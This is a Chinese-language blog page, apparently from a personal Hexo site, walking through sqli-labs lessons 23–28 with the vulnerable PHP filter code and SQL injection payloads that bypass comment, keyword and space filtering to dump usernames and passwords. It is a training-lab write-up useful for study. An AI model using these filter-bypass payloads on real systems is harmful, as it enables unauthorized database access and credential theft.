@@ -1,0 +1,329 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL:sqlilabs less-23-28:绕过注释进行注入 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="介绍preg_replace() 函数：preg_replace 函数执行一个正则表达式的搜索和替换。
+语法mixed preg_replace ( mixed $pattern , mixed $,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SQL:sqlilabs less-23-28:绕过注释进行注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SQL:sqlilabs less-23-28:绕过注释进行注入</h1>
+        <div class="stuff">
+            <span>十二月 27, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h3 id="介绍preg-replace-函数："><a href="#介绍preg-replace-函数：" class="headerlink" title="介绍preg_replace() 函数："></a>介绍preg_replace() 函数：</h3><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></pre>
+<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
+<p>参数说明：</p>
+<ul>
+<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
+<li>$replacement: 用于替换的字符串或字符串数组。</li>
+<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
+<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
+<li>$count: 可选，为替换执行的次数。</li>
+</ul>
+<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p>
+<p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p>
+<h3 id="less-23-绕过注释符过滤（采用union注入）"><a href="#less-23-绕过注释符过滤（采用union注入）" class="headerlink" title="less-23:绕过注释符过滤（采用union注入）"></a>less-23:绕过注释符过滤（采用union注入）</h3><p>源代码中：</p>
+<pre><code>$reg = "/#/";
+$reg1 = "/--/";
+$replace = "";
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre>
+<p>在获取id参数时进行了#，–注释符号的过滤。</p>
+<p>所以构造payload：</p>
+<pre><code>?id=1' union select 1,(select database()),'3</code></pre>
+<pre><code>?id=-1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1</code></pre>
+<p>直接获取字段：</p>
+<pre><code>?id=-1' union select 1,(select group_concat(username,0x3a,password) from users),'3</code></pre>
+<h3 id="less-25-绕过or和and过滤（采用extractvalue-报错注入）"><a href="#less-25-绕过or和and过滤（采用extractvalue-报错注入）" class="headerlink" title="less-25:绕过or和and过滤（采用extractvalue()报错注入）"></a>less-25:绕过or和and过滤（采用extractvalue()报错注入）</h3><p>源代码中：</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)
+    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)
+
+    return $id;
+}
+$id=$_GET['id'];
+$id= blacklist($id);
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre>
+<p>可见此处对or和and进行了过滤</p>
+<h4 id="绕过or和and过滤，提供以下几种思路："><a href="#绕过or和and过滤，提供以下几种思路：" class="headerlink" title="绕过or和and过滤，提供以下几种思路："></a>绕过or和and过滤，提供以下几种思路：</h4><p>1.大小写变形 Or,OR,oR<br>2.编码，hex，urlencode<br>3.添加注释/<em>or</em>/<br>4.利用符号 and=&amp;&amp;  or=||<br>5.双写or或and绕过</p>
+<p>less-25只能采用方法4.5，所以直接爆字段：</p>
+<pre><code>?id=1' || extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))--+</code></pre>
+<h3 id="less-25a-绕过or和and过滤（采用union注入）"><a href="#less-25a-绕过or和and过滤（采用union注入）" class="headerlink" title="less-25a:绕过or和and过滤（采用union注入）"></a>less-25a:绕过or和and过滤（采用union注入）</h3><p>源代码：</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)
+    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)
+
+    return $id;
+}
+$id=$_GET['id'];
+$id= blacklist($id);
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre>
+<p>对于less-25而言less-25a没有‘’包含，和输出错误项，因此不能采用报错注入，因此可采用联合注入和延时注入，直接爆字段：</p>
+<pre><code>?id=-1 union select 1,(select group_concat(id,0x3e,referer,0x3e,ip_address) from referers),2</code></pre>
+<h3 id="less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）"><a href="#less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）" class="headerlink" title="less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）"></a>less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）</h3><p>源代码：</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)
+    $id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive)
+    $id= preg_replace('/[\/\*]/',"", $id);      //strip out /*
+    $id= preg_replace('/[--]/',"", $id);        //Strip out --
+    $id= preg_replace('/[#]/',"", $id);         //Strip out #
+    $id= preg_replace('/[\s]/',"", $id);        //Strip out spaces
+    $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes
+    return $id;
+}
+$id=$_GET['id'];
+$id= blacklist($id);
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+
+print_r(mysql_error());</code></pre>
+<p>将空格,or,and,/*,#,–,/等各种符号过滤</p>
+<h4 id="关于空格符号的过滤包括以下几种方法："><a href="#关于空格符号的过滤包括以下几种方法：" class="headerlink" title="关于空格符号的过滤包括以下几种方法："></a>关于空格符号的过滤包括以下几种方法：</h4><ol>
+<li>%09 TAB键（水平）</li>
+<li>%0a 新建一行</li>
+<li>%0c 新的一页</li>
+<li>%0d return功能</li>
+<li>%0b TAB键（垂直）</li>
+<li>%a0 空格</li>
+</ol>
+<p>因此直接爆数据库：</p>
+<pre><code>?id=1'%a0union%a0select%a0(!(select%a0*%a0from%a0(select%a0database())x)%a0-%a0~0),2,3%a0||%a0'1</code></pre>
+<pre><code>?id=1'%20union%20select%20(!(select%20*%20from%20(select%20database())x)%20-%20~0),2,3%20||%20'1</code></pre>
+<h3 id="Less-27-绕过union、select等过滤union注入"><a href="#Less-27-绕过union、select等过滤union注入" class="headerlink" title="Less-27 绕过union、select等过滤union注入"></a>Less-27 绕过union、select等过滤union注入</h3><pre><code>function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*
+$id= preg_replace('/[--]/',"", $id);        //Strip out --.
+$id= preg_replace('/[#]/',"", $id);            //Strip out #.
+$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);        //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);        //Strip out union
+$id= preg_replace('/select/s',"", $id);        //Strip out select 
+$id= preg_replace('/UNION/s',"", $id);        //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);        //Strip out Union
+$id= preg_replace('/Select/s',"", $id);        //Strip out select
+return $id;
+}
+
+$id=$_GET['id'];
+$id= blacklist($id);
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());</code></pre>
+<h4 id="只需要将union和select改为大小写混合就可以突破。"><a href="#只需要将union和select改为大小写混合就可以突破。" class="headerlink" title="只需要将union和select改为大小写混合就可以突破。"></a>只需要将union和select改为大小写混合就可以突破。</h4><pre><code>?id=100'unIOn%a0seLect%a01,database(),'3</code></pre>
+<h4 id="TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。"><a href="#TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。" class="headerlink" title="TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。"></a>TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。</h4><h3 id="Less-27a-绕过union、select等过滤union注入"><a href="#Less-27a-绕过union、select等过滤union注入" class="headerlink" title="Less-27a 绕过union、select等过滤union注入"></a>Less-27a 绕过union、select等过滤union注入</h3><pre><code>function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*
+$id= preg_replace('/[--]/',"", $id);        //Strip out --.
+$id= preg_replace('/[#]/',"", $id);            //Strip out #.
+$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);        //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);        //Strip out union
+$id= preg_replace('/select/s',"", $id);        //Strip out select
+$id= preg_replace('/UNION/s',"", $id);        //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);        //Strip out Union
+$id= preg_replace('/Select/s',"", $id);        //Strip out Select
+return $id;
+}
+$id=$_GET['id'];
+$id= blacklist($id);
+$id = '"' .$id. '"';
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+//print_r(mysql_error());</code></pre>
+<pre><code>?id=100"unIOn%a0seLect%a01,database(),"3</code></pre>
+<h4 id="TIPS：这里说下以上payload我们利用最后的3前面的-“-将后面的-“-给闭合掉。或者亦可以利用以前的方法-1-database-3-“1，同时本关可以用延时注入的方法进行注入。"><a href="#TIPS：这里说下以上payload我们利用最后的3前面的-“-将后面的-“-给闭合掉。或者亦可以利用以前的方法-1-database-3-“1，同时本关可以用延时注入的方法进行注入。" class="headerlink" title="TIPS：这里说下以上payload我们利用最后的3前面的 “ 将后面的 “ 给闭合掉。或者亦可以利用以前的方法 1,database(),3 || “1，同时本关可以用延时注入的方法进行注入。"></a>TIPS：这里说下以上payload我们利用最后的3前面的 “ 将后面的 “ 给闭合掉。或者亦可以利用以前的方法 1,database(),3 || “1，同时本关可以用延时注入的方法进行注入。</h4><h3 id="Less-28-绕过union-s-select等过滤-union注入"><a href="#Less-28-绕过union-s-select等过滤-union注入" class="headerlink" title="Less-28 绕过union\s+select等过滤 union注入"></a>Less-28 绕过union\s+select等过滤 union注入</h3><pre><code>function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*
+$id= preg_replace('/[--]/',"", $id);                //Strip out --.
+$id= preg_replace('/[#]/',"", $id);                    //Strip out #.
+$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
+//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
+$id= preg_replace('/union\s+select/i',"", $id);        //Strip out UNION &amp; SELECT.
+return $id;
+}
+
+$id=$_GET['id'];
+$id= blacklist($id);
+$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+//print_r(mysql_error());</code></pre>
+<p>正则表达式’/union\s+select/i’中，\s表示空格，+表示匹配一次或多次，/i表示不区分大小写，所以整体表示匹配 union加一个或多个空格加select，其中union和select不区分大小写。</p>
+<p>所以我们可以将union 和 select中间的空格使用%a替换，我们直接给出一个payload：</p>
+<pre><code>http://127.0.0.1/sql/Less-28/?id=100')union%a0select%a01,database(),3||('1</code></pre>
+<h3 id="Less-28a-绕过union-s-select等过滤-union注入"><a href="#Less-28a-绕过union-s-select等过滤-union注入" class="headerlink" title="Less-28a 绕过union\s+select等过滤 union注入"></a>Less-28a 绕过union\s+select等过滤 union注入</h3><pre><code>function blacklist($id)
+{
+//$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*
+//$id= preg_replace('/[--]/',"", $id);                //Strip out --.
+//$id= preg_replace('/[#]/',"", $id);                    //Strip out #.
+//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
+//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.
+//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
+$id= preg_replace('/union\s+select/i',"", $id);        //Strip out spaces.
+return $id;
+}
+
+$id=$_GET['id'];
+$id= blacklist($id);
+$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+//print_r(mysql_error());</code></pre>
+<pre><code>?id=100')union%a0select 1,database(),3||('1</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8Dpreg-replace-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">介绍preg_replace() 函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="toc-number">1.2.</span> <span class="toc-text">返回值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-23-%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4%EF%BC%88%E9%87%87%E7%94%A8union%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">less-23:绕过注释符过滤（采用union注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-25-%E7%BB%95%E8%BF%87or%E5%92%8Cand%E8%BF%87%E6%BB%A4%EF%BC%88%E9%87%87%E7%94%A8extractvalue-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">less-25:绕过or和and过滤（采用extractvalue()报错注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87or%E5%92%8Cand%E8%BF%87%E6%BB%A4%EF%BC%8C%E6%8F%90%E4%BE%9B%E4%BB%A5%E4%B8%8B%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">绕过or和and过滤，提供以下几种思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-25a-%E7%BB%95%E8%BF%87or%E5%92%8Cand%E8%BF%87%E6%BB%A4%EF%BC%88%E9%87%87%E7%94%A8union%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">less-25a:绕过or和and过滤（采用union注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-26%EF%BC%9A%E7%BB%95%E8%BF%87or%E3%80%81and%E3%80%81%E6%B3%A8%E9%87%8A%E7%AC%A6%E3%80%81%E7%A9%BA%E6%A0%BC%E3%80%81%E6%96%9C%E6%9D%A0%E8%BF%87%E6%BB%A4%EF%BC%88bigint%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%A9%BA%E6%A0%BC%E7%AC%A6%E5%8F%B7%E7%9A%84%E8%BF%87%E6%BB%A4%E5%8C%85%E6%8B%AC%E4%BB%A5%E4%B8%8B%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">关于空格符号的过滤包括以下几种方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27-%E7%BB%95%E8%BF%87union%E3%80%81select%E7%AD%89%E8%BF%87%E6%BB%A4union%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">Less-27 绕过union、select等过滤union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AA%E9%9C%80%E8%A6%81%E5%B0%86union%E5%92%8Cselect%E6%94%B9%E4%B8%BA%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%AA%81%E7%A0%B4%E3%80%82"><span class="toc-number">6.1.</span> <span class="toc-text">只需要将union和select改为大小写混合就可以突破。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TIPS%EF%BC%9Auniunionon%E4%B9%9F%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E7%9A%84%E3%80%82%E4%BA%A6%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%92%8C%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E8%AF%AD%E6%B3%95%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%E3%80%82"><span class="toc-number">6.2.</span> <span class="toc-text">TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27a-%E7%BB%95%E8%BF%87union%E3%80%81select%E7%AD%89%E8%BF%87%E6%BB%A4union%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">Less-27a 绕过union、select等过滤union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TIPS%EF%BC%9A%E8%BF%99%E9%87%8C%E8%AF%B4%E4%B8%8B%E4%BB%A5%E4%B8%8Apayload%E6%88%91%E4%BB%AC%E5%88%A9%E7%94%A8%E6%9C%80%E5%90%8E%E7%9A%843%E5%89%8D%E9%9D%A2%E7%9A%84-%E2%80%9C-%E5%B0%86%E5%90%8E%E9%9D%A2%E7%9A%84-%E2%80%9C-%E7%BB%99%E9%97%AD%E5%90%88%E6%8E%89%E3%80%82%E6%88%96%E8%80%85%E4%BA%A6%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%BB%A5%E5%89%8D%E7%9A%84%E6%96%B9%E6%B3%95-1-database-3-%E2%80%9C1%EF%BC%8C%E5%90%8C%E6%97%B6%E6%9C%AC%E5%85%B3%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%E3%80%82"><span class="toc-number">7.1.</span> <span class="toc-text">TIPS：这里说下以上payload我们利用最后的3前面的 “ 将后面的 “ 给闭合掉。或者亦可以利用以前的方法 1,database(),3 || “1，同时本关可以用延时注入的方法进行注入。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28-%E7%BB%95%E8%BF%87union-s-select%E7%AD%89%E8%BF%87%E6%BB%A4-union%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">Less-28 绕过union\s+select等过滤 union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28a-%E7%BB%95%E8%BF%87union-s-select%E7%AD%89%E8%BF%87%E6%BB%A4-union%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">Less-28a 绕过union\s+select等过滤 union注入</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
